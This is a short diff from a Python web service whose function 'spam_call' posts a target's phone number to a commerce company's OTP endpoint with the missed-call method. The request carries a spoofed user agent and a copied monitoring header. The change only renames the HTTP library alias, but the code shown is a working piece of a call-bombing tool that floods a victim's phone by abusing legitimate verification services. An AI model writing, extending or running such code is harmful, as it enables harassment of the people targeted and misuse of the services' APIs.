@@ -1515,7 +1515,7 @@ def spam_call():
     user_agents = api_response.json().get("user_agents", [])
     user_agent = user_agents[0] if user_agents else "Default User Agent"
     # Verifikasi kunci API
-    dagang=cihuy.post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": user_agent, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{phone}", "otp_method": "missedcall"}).text
+    dagang=requests.post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": user_agent, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{phone}", "otp_method": "missedcall"}).text
 
     if 'OTP berhasil dikirim' in dagang:
         return jsonify({
